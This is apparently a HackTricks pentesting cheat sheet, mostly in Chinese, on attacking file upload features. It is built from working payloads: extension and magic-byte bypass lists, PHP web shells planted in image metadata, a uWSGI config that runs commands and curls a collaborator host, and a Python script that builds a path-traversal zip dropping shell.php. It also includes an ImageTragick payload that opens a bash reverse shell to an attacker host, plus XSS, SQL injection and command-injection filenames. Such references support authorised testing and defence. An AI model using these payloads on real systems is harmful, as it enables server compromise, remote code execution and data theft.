# 文件上传

{{#include ../../banners/hacktricks-training.md}}

## 文件上传 常规方法

其他有用的扩展名：

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **在 PHPv8 中工作**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### 绕过文件扩展名检查

1. 如果适用，**检查**之前列出的**扩展名**。也要用一些**大小写混合**来测试它们： _pHp, .pHP5, .PhAr ..._
2. _尝试在执行扩展之前添加一个有效扩展（也可使用前面提到的扩展）：_
- _file.png.php_
- _file.png.Php5_
3. 尝试在结尾添加**特殊字符**。可以使用 Burp 去**暴力测试**所有的 **ascii** 和 **Unicode** 字符。(_注意：你也可以尝试使用之前提到的那些**扩展名**_) 
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. 尝试通过**欺骗服务器端的扩展名解析器**来绕过防护，例如**双写扩展**或在扩展之间**添加垃圾数据（null 字节）**。_你也可以使用之前列出的扩展名来构造更好的 payload。_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 为前面的检查**再添加一层扩展**：
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. 尝试把**可执行扩展放在有效扩展之前**并希望服务器配置错误。 (useful to exploit Apache misconfigurations where anything with extension** _**.php**_**, but** not necessarily ending in .php** will execute code):
- _ex: file.php.png_
7. 在 **Windows** 上使用 **NTFS alternate data stream (ADS)**。在这种情况下，会在被禁止的扩展之后和允许的扩展之前插入一个冒号字符 ":"。结果会在服务器上创建一个带有被禁止扩展的**空文件**（例如 "file.asax:.jpg"）。随后可能通过短文件名等技术对该文件进行编辑。模式 "**::$data**” 也可以用来创建非空文件。因此，在该模式后添加一个点字符也可能有助于绕过进一步的限制（例如 "file.asp::$data."）
8. 尝试突破文件名长度限制。有效扩展被截断，恶意的 PHP 得以保留。 AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### 绕过 Content-Type、Magic Number、压缩与缩放

- 通过将请求头的 **Content-Type** 值设置为: _image/png_ , _text/plain , application/octet-stream_ 来绕过 **Content-Type** 检查。
1. Content-Type **字典**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- 通过在文件开头添加一个真实图片的**字节**（混淆 `file` 命令）来绕过 **magic number** 检查。或者将 web shell 放入图片的**元数据**中：\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` 或者你也可以**直接把 payload 写入图片**：\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- 如果你的图片在上传后会被压缩（例如使用一些标准的 PHP 库如 [PHP-GD](https://www.php.net/manual/fr/book.image.php)），上面的技术可能不起作用。然而，你可以使用 **PLTE chunk** [**此处定义的技术**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 将一些文本插入进去，从而**在压缩后仍能存活**。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- 页面也可能在处理时对图片进行**缩放**，例如使用 PHP-GD 的 `imagecopyresized` 或 `imagecopyresampled`。不过你可以使用 **IDAT chunk** [**此处定义的技术**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 插入一些文本，从而**在压缩/缩放后仍能存活**。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- 另一个让 payload **在图片缩小后仍能存活** 的技术，针对 PHP-GD 的 `thumbnailImage`。你可以使用 **tEXt chunk** [**此处定义的技术**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 来插入文本，从而**在压缩/缩放后仍能存活**。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### 其他需要检查的技巧

- 寻找可以**重命名（rename）**已上传文件的漏洞（以改变扩展名）。
- 寻找 **Local File Inclusion** 漏洞以执行后门。
- **可能的信息泄露**：
1. 多次（并且同时）上传**相同名字**的**同一个文件**
2. 上传一个名称与已有**文件**或**目录**相同的文件
3. 上传名为 `"."`, `".."`, 或 `"…"` 的文件。例如，在 Windows 的 Apache 中，如果应用将上传文件保存到 "/www/uploads/" 目录，名为 "." 的文件会在 "/www/" 目录下创建一个名为 "uploads" 的文件。
4. 上传一个在 NTFS 中不易删除的文件，例如 **"…:.jpg"**。（Windows）
5. 在 Windows 中上传带有非法字符（如 `|<>*?”`）的文件名。（Windows）
6. 在 Windows 中使用保留（禁止）名称上传文件，例如 CON、PRN、AUX、NUL、COM1 … COM9、LPT1 … LPT9。
- 也可以尝试上传一个可执行文件（.exe）或一个 .html（更不显眼），以便当受害者意外打开时执行代码。

### 特殊扩展技巧

如果你试图向 **PHP server** 上传文件，查看 **.htaccess** 的技巧以执行代码：[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
如果你试图向 **ASP server** 上传文件，查看使用 **.config** 文件执行代码的技巧：../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files

`.phar` 文件类似于 Java 的 `.jar`，但用于 php，可以**像 php 文件一样被使用**（通过 php 执行，或包含到脚本中...）

`.inc` 扩展有时用于仅用于**导入（include）**的 php 文件，因此有时可能被允许**执行**。

## **Jetty RCE**

如果你能向 Jetty server 上传一个 XML 文件，你可以获得 [RCE，因为新的 \*.xml 和 \*.war 会被自动处理](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**。** 如下图所示，将 XML 文件上传到 `$JETTY_BASE/webapps/` 并期待 shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

对于该漏洞的详细研究请参阅原始研究： [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)。

如果可以修改 `.ini` 配置文件，uWSGI server 上可能会发生远程命令执行（RCE）。uWSGI 配置文件使用特定语法来包含“magic”变量、占位符和操作符。值得注意的是，'@' 操作符（以 `@(filename)` 形式使用）用于包含文件内容。在 uWSGI 支持的多种 scheme 中，"exec" scheme 非常强大，它允许从进程的标准输出读取数据。当 `.ini` 配置文件被处理时，该特性可能被滥用以实现 Remote Command Execution 或 Arbitrary File Write/Read。

考虑下面这个有害的 `uwsgi.ini` 文件示例：
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

payload 的执行发生在配置文件被解析期间。要使配置被激活并解析，uWSGI 进程必须被重启（可能是在崩溃之后或由于 Denial of Service attack），或者该文件必须设置为 auto-reload。如果启用了 auto-reload 功能，检测到更改后会在指定的时间间隔重新加载该文件。

It's crucial to understand the lax nature of uWSGI's configuration file parsing. Specifically, the discussed payload can be inserted into a binary file (such as an image or PDF), further broadening the scope of potential exploitation.

理解 uWSGI 对配置文件解析的宽松特性至关重要。具体来说，上述 payload 可以被插入到二进制文件中（例如 image 或 PDF），从而进一步扩大潜在利用的范围。

## **wget 文件上传/SSRF 技巧**

In some occasions you may find that a server is using **`wget`** to **download files** and you can **indicate** the **URL**. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, **this check can be bypassed.**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"\*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"\*232+".php"**.

在某些情况下，你可能会发现服务器使用 **`wget`** 来 **下载文件**，并且你可以指明 **URL**。在这些情况下，代码可能会检查被下载文件的扩展名是否在白名单内，以确保只会下载允许的文件。然而，**该检查可以被绕过。**\
在 **linux** 中，**文件名** 的最大长度是 **255**，然而，**wget** 会将文件名截断为 **236** 个字符。你可以 **download a file called "A"\*232+".php"+".gif"**，这个文件名将会 **绕过** 该 **检查**（在此例中 **".gif"** 是一个 **有效** 的扩展），但 `wget` 会 **重命名** 该文件为 **"A"\*232+".php"**。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
注意，**另一个选项**（你可能在想的）绕过此检查的方法是让 **HTTP server 重定向到不同的文件**，这样初始 URL 会绕过检查，然后 wget 会下载被重定向后的新名字文件。除非使用了参数 `--trust-server-names`，否则这**不会起作用**，因为 **wget 会使用原始 URL 中指示的文件名来下载被重定向的页面**。

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) 是一个强大的工具，旨在帮助 Pentesters 和 Bug Hunters 测试 file upload mechanisms。它利用多种 bug bounty 技巧来简化识别和利用漏洞的过程，确保对 web applications 进行全面评估。

### Corrupting upload indices with snprintf quirks (historical)

一些使用 `snprintf()` 或类似函数从单文件上传构建多文件数组的遗留 upload handlers，可能会被欺骗以伪造 `_FILES` 结构。由于 `snprintf()` 行为的不一致性和截断，精心构造的单次上传可能在服务器端表现为多个索引文件，从而混淆假定严格形状（例如当作多文件上传并进入不安全分支）的逻辑。虽然今天这种情况较为冷门，但这种“索引损坏”模式偶尔会在 CTFs 和较旧的代码库中再次出现。

## From File upload to other vulnerabilities

- 将 **filename** 设置为 `../../../tmp/lol.png` 并尝试实现 **path traversal**
- 将 **filename** 设置为 `sleep(10)-- -.jpg`，你可能能够实现 **SQL injection**
- 将 **filename** 设置为 `<svg onload=alert(document.domain)>` 以实现 **XSS**
- 将 **filename** 设置为 `; sleep 10;` 来测试一些 **command injection**（更多 [command injections tricks here](../command-injection.md)）
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- 尝试来自 [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) 的不同 svg payloads
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- 如果你可以**指示 web server 从一个 URL 抓取图片**，你可以尝试滥用 [SSRF](../ssrf-server-side-request-forgery/index.html)。如果该 **image** 将被**保存在某个公开站点**，你也可以指向来自 [https://iplogger.org/invisible/](https://iplogger.org/invisible/) 的 URL 并**窃取每个访问者的信息**。
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- 特别构造的 PDFs 导致 XSS：以下页面展示了如何 **inject PDF data to obtain JS execution** (见链接)。如果你可以上传 PDFs，你可以按指示准备某些会执行任意 JS 的 PDF。
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) 内容以检查服务器是否存在任何 **antivirus**
- 检查上传文件时是否存在任何 **大小限制**

这里有一个通过上传可以实现的前 10 项（来自 [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)）：

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

参阅 [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) 了解其他 filetypes。

## Zip/Tar File Automatically decompressed Upload

如果你可以上传一个会在服务器内被解压的 ZIP，你可以做两件事：

### Symlink

上传一个包含指向其他文件的 soft links 的链接，然后访问解压后的文件时，你将访问被链接的文件：
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 在不同文件夹中解压

在解压缩过程中意外在目录中创建文件是一个严重问题。尽管最初假定这种设置可以防止通过恶意文件上传触发操作系统级别的命令执行，但 ZIP 格式对层级压缩和目录遍历的支持可能被利用。攻击者可以通过操纵目标应用程序的解压缩功能来绕过限制并从安全的上传目录中逃逸。

可以在 [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) 找到用于构造此类文件的自动化利用工具。该工具可以按如下方式使用：
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
此外，**symlink trick with evilarc** 也是一种可选方案。

如果目标是针对像 `/flag.txt` 这样的文件，则应在系统中创建指向该文件的 symlink。这样可以确保 evilarc 在运行时不会遇到错误。

下面是用于创建恶意 zip 文件的 Python 代码示例：
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**滥用压缩进行 file spraying**

进一步细节 **请查看原文帖在**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: 编写 PHP 代码以执行通过 `$_REQUEST` 变量传入的命令。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 创建多个文件并将这些文件打包为 zip 归档。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: 使用 vi 或十六进制编辑器修改 zip 内的文件名，将 "xxA" 更改为 "../" 以实现目录遍历。

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

将此内容以图片扩展名上传以利用该漏洞 **(ImageMagick , 7.0.1-1)**（参考该 [exploit](https://www.exploit-db.com/exploits/39767)）
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## 在 PNG 中嵌入 PHP Shell

将 PHP shell 嵌入 PNG 文件的 IDAT 块，可以有效绕过某些图像处理操作。来自 PHP-GD 的 `imagecopyresized` 和 `imagecopyresampled` 函数在这方面尤其相关，因为它们通常用于调整图像大小和重采样。被嵌入的 PHP shell 不受这些操作影响的能力，对于某些用例是重要的优势。

关于该技术的详细探讨（包括方法和潜在应用），见下文文章：["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)。该资源提供了对该过程及其影响的全面理解。

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files 在网络安全中是独特的工具，像变色龙一样，能够同时以多种文件格式合法存在。一个有趣的例子是 [GIFAR](https://en.wikipedia.org/wiki/Gifar)，它既能作为 GIF 工作，也能作为 RAR 归档。此类文件不限于这一组合；像 GIF 与 JS 或 PPT 与 JS 的组合也都是可行的。

polyglot 文件的核心用途在于其绕过基于类型筛查的安全措施的能力。许多应用通常只允许上传某些文件类型，例如 JPEG、GIF 或 DOC，以降低潜在危险格式（例如 JS、PHP 或 Phar 文件）带来的风险。然而，polyglot 通过同时符合多种文件格式的结构要求，可以悄然绕过这些限制。

尽管适应性强，polyglot 也存在局限。例如，虽然一个 polyglot 可能同时具备 PHAR 文件（PHp ARchive）和 JPEG 的特性，但其能否成功上传可能取决于平台对文件扩展名的策略。如果系统严格限制允许的扩展名，polyglot 的结构双重性可能不足以保证上传成功。

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

How to avoid file type detections by uploading a valid JSON file even if not allowed by faking a PDF file (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: 只要 `%PDF` 魔术字节位于前 1024 字节内就被视为有效（示例见文章）
- **`pdflib` library**: 在 JSON 的某个字段中加入伪造的 PDF 内容，使库认为这是一个 pdf（示例见文章）
- **`file` binary**: 它最多能读取文件的前 1048576 字节。只需创建一个比这更大的 JSON，使其无法将内容解析为 JSON，然后在 JSON 内放入真实 PDF 的起始部分，它就会认为这是 PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
